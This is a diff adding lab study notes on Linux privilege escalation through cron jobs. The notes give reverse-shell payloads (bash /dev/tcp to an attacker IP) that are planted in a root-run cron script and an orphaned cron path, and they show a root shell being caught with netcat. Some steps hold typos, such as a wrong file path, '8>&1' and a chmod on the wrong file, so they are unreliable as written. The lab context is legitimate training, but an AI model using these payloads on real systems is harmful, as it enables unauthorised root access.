@@ -423,8 +423,111 @@ ls -l /home/karen/vim
 # id
 uid=0(root) gid=1001(karen) groups=1001(karen)
 ```
-
 ## Privilege Escalation: Cron Jobs
+* Cron jobs are used to run scripts or binaries at specific times.
+* Run with privilege of their owner by default.
+* If a scheduled task that runs with root privileges can be changed (ideally to a shell) then this is a privilege escalation vector.
+* Configurations stored as crontabs (cron tables).
+  * Determines next time and date task will run.
+* Every user has own crontab file.
+* Any user can read system-wide cron jobs file.
+```
+cat /etc/crontab
+
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * *  root /antivirus.sh
+* * * * *  root antivirus.sh
+* * * * *  root /home/karen/backup.sh
+* * * * *  root /tmp/test.py
+```
+* All scripts configured to run every minute.
+* Contents of `/home/karen/backup.sh`.
+```
+cat /home/karen/backup.sh
+#!/bin/bash
+cd /home/admin/1/2/3/Results
+zip -r /home/admin/download.zip ./*
+```
+* Modify accessible script to create a reverse shell.
+* `nc` will most likely not support `-e` option due to security.
+* Always prefer to start reverse shells.
+  * Do not want to compromise system integrity.
+* Create Reverse shell script.
+1. `nano /home/karen/backup/sh`
+2. Delete bottom two lines.
+4. Add `bash -i >& /dev/tcp/10.10.16.10/6666 0>&1`
+   * IP address is that of the attacker.
+7. CTRL+X to save and exit.
+* Ensure that script is executable.
+```
+chmod +x /home/karen/backup.sh
+```
+* Run listener on attacking machine to receive incoming connection.
+```
+nc -nlvp 6666
+Listening on [0.0.0.0] (family 0, port 6666)
+
+Connection from 10.10.43.228 40628 received!
+bash: cannot set terminal process group (12806): Inappropriate ioctl for device
+bash: no job control in this shell
+root@ip-10-10-43-228:~#
+root@ip-10-10-43-228:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@ip-10-10-43-228:~# whoami
+whoami
+root
+root@ip-10-10-43-228:~# 
+```
+* Crontab can sometimes lead to easy priviledge escalation vectors.
+1. System admin needs to run script at regular intervals.
+2. Creates a cron job to do this.
+3. Script becomes obsolete and is deleted.
+4. Cron job is not cleaned up.
+   * Change management failure results in potential exploit.
+   * `test.py` has been deleted but cron job still exists.
+```
+find /tmp -name test.py
+```
+* Cron refers to paths listed under `PATH` variable in `/etc/crontab` file if full script is not defined.
+* Create script named `test.py` in `/tmp` folder to be run by the cron job.
+1. `nano tmp/test.py`
+2. Enter reverse shell code.
+```
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.16.10/6666 8>&1
+```
+4. CTRL+X to save and exit.
+5. Make script executable.
+```
+chmod +x ./antivirus.sh
+```
+6. Create listener on attacking machine to catch connection.
+```
+nc -lvnp 6666
+```
 ## Privilege Escalation: PATH
 ## Privilege Escalation: NFS
 ## Capstone Challenge
